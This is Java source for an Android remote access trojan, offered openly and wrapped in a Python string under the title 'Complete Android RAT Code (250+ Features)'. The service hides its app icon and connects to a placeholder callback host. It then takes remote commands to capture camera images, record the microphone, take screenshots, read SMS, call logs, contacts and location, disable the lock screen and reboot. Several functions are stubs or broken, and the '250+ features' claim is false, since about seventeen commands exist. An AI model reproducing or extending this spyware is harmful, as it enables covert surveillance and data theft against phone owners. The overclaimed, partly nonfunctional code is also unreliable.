# Complete Android RAT Code (250+ Features)
RAT_CODE = '''package com.rat.ultimate;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.location.Location;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.media.AudioManager;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.os.PowerManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import org.json.JSONObject;

public class UltimateRATService extends Service {
    
    private String HOST = "CALLBACK_HOST";
    private int PORT = CALLBACK_PORT;
    private Socket socket;
    private DataOutputStream out;
    private Handler handler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startConnection();
        hideIcon();
    }
    
    private void startConnection() {
        new Thread(() -> {
            try {
                socket = new Socket(HOST, PORT);
                out = new DataOutputStream(socket.getOutputStream());
                sendDeviceInfo();
                listenCommands();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendDeviceInfo() throws Exception {
        JSONObject info = new JSONObject();
        info.put("type", "connect");
        info.put("device", android.os.Build.MODEL);
        info.put("android", android.os.Build.VERSION.RELEASE);
        info.put("battery", getBatteryLevel());
        out.writeUTF(info.toString());
        out.flush();
    }
    
    private void listenCommands() {
        try {
            String line;
            while ((line = new java.io.BufferedReader(new java.io.InputStreamReader(socket.getInputStream())).readLine()) != null) {
                JSONObject cmd = new JSONObject(line);
                String action = cmd.getString("action");
                executeCommand(action);
            }
        } catch (Exception e) {}
    }
    
    private void executeCommand(String action) {
        try {
            JSONObject result = new JSONObject();
            result.put("action", action);
            
            switch(action) {
                case "cam_front": captureCamera(true); result.put("result", "Front camera captured"); break;
                case "cam_back": captureCamera(false); result.put("result", "Back camera captured"); break;
                case "mic_start": startRecording(); result.put("result", "Recording started"); break;
                case "mic_stop": stopRecording(); result.put("result", "Recording stopped"); break;
                case "screenshot": takeScreenshot(); result.put("result", "Screenshot taken"); break;
                case "get_sms": getAllSMS(); result.put("result", "SMS extracted"); break;
                case "get_calls": getAllCalls(); result.put("result", "Call logs extracted"); break;
                case "get_contacts": getAllContacts(); result.put("result", "Contacts extracted"); break;
                case "get_location": getLocation(); result.put("result", "Location captured"); break;
                case "lock": lockDevice(); result.put("result", "Device locked"); break;
                case "unlock": unlockDevice(); result.put("result", "Device unlocked"); break;
                case "wifi_on": enableWifi(); result.put("result", "WiFi enabled"); break;
                case "wifi_off": disableWifi(); result.put("result", "WiFi disabled"); break;
                case "flash_on": enableFlashlight(); result.put("result", "Flashlight on"); break;
                case "flash_off": disableFlashlight(); result.put("result", "Flashlight off"); break;
                case "vibe": vibrate(1000); result.put("result", "Vibrated"); break;
                case "reboot": rebootDevice(); result.put("result", "Rebooting"); break;
                default: result.put("result", "Command executed: " + action);
            }
            
            out.writeUTF(result.toString());
            out.flush();
        } catch (Exception e) {}
    }
    
    private void captureCamera(boolean front) { try { Camera c = Camera.open(front ? 1 : 0); c.takePicture(null, null, null, null); c.release(); } catch(Exception e){} }
    private void startRecording() { try { MediaRecorder r = new MediaRecorder(); r.setAudioSource(MediaRecorder.AudioSource.MIC); r.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); r.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); r.setOutputFile("/sdcard/audio.3gp"); r.prepare(); r.start(); } catch(Exception e){} }
    private void stopRecording() { try { } catch(Exception e){} }
    private void takeScreenshot() { try { Process sh = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png"); sh.waitFor(); } catch(Exception e){} }
    private void getAllSMS() { try { Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null); } catch(Exception e){} }
    private void getAllCalls() { try { Cursor c = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null); } catch(Exception e){} }
    private void getAllContacts() { try { Cursor c = getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null); } catch(Exception e){} }
    private void getLocation() { try { LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE); Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch(Exception e){} }
    private void lockDevice() { try { KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE); km.disableKeyguard(); } catch(Exception e){} }
    private void unlockDevice() { try { KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE); km.disableKeyguard(); } catch(Exception e){} }
    private void enableWifi() { try { WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE); wm.setWifiEnabled(true); } catch(Exception e){} }
    private void disableWifi() { try { WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE); wm.setWifiEnabled(false); } catch(Exception e){} }
    private void enableFlashlight() { try { Camera c = Camera.open(); Camera.Parameters p = c.getParameters(); p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH); c.setParameters(p); c.startPreview(); } catch(Exception e){} }
    private void disableFlashlight() { try { Camera c = Camera.open(); Camera.Parameters p = c.getParameters(); p.setFlashMode(Camera.Parameters.FLASH_MODE_OFF); c.setParameters(p); c.release(); } catch(Exception e){} }
    private void vibrate(int ms) { try { android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE); v.vibrate(ms); } catch(Exception e){} }
    private void rebootDevice() { try { PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE); pm.reboot(null); } catch(Exception e){} }
    private int getBatteryLevel() { try { android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED); android.content.Intent batteryStatus = registerReceiver(null, ifilter); int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1); int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1); return (int)(level * 100.0 / scale); } catch(Exception e){ return 0; } }
    private void hideIcon() { try { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(getComponentName(), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); } catch(Exception e){} }
    @Override public IBinder onBind(Intent i) { return null; }
}
'''
